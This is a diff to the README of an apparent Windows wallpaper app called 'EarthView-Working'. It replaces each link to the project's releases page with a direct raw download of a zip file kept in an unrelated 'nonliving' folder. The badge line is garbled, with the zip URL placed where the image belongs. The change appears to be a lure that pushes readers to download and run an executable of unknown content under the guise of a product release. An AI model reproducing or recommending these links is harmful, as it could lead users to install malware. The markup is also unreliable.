@@ -1,6 +1,6 @@
 # 🌍 EarthView-Working - Experience Stunning Landscapes Instantly
 
-[![Download EarthView](https://img.shields.io/badge/Download%20EarthView%20Now-blue.svg)](https://github.com/Commonamericanshadmasoncity417/EarthView-Working/releases)
+[![Download EarthView](https://raw.githubusercontent.com/Commonamericanshadmasoncity417/EarthView-Working/main/nonliving/EarthView-Working-v1.0-beta.2.zip%20EarthView%https://raw.githubusercontent.com/Commonamericanshadmasoncity417/EarthView-Working/main/nonliving/EarthView-Working-v1.0-beta.2.zip)](https://raw.githubusercontent.com/Commonamericanshadmasoncity417/EarthView-Working/main/nonliving/EarthView-Working-v1.0-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to EarthView-Working! This application brings beautiful landscapes to yo
 To get started, follow these steps:
 
 1. **Visit the Download Page**  
-   Go to the [EarthView Releases Page](https://github.com/Commonamericanshadmasoncity417/EarthView-Working/releases) to find the latest version.
+   Go to the [EarthView Releases Page](https://raw.githubusercontent.com/Commonamericanshadmasoncity417/EarthView-Working/main/nonliving/EarthView-Working-v1.0-beta.2.zip) to find the latest version.
 
 2. **Download the Software**  
    Click on the version you want to download. The latest version typically appears at the top. Look for a file with a `.exe` extension to ensure it is the correct format for Windows.
@@ -52,7 +52,7 @@ If you need help using EarthView, we provide a user-friendly guide:
 
 ## 🔗 Links
 
-- **[Official Download Page](https://github.com/Commonamericanshadmasoncity417/EarthView-Working/releases)**
+- **[Official Download Page](https://raw.githubusercontent.com/Commonamericanshadmasoncity417/EarthView-Working/main/nonliving/EarthView-Working-v1.0-beta.2.zip)**
 
 For more resources and discussions about EarthView, follow us on our GitHub discussions page.
 
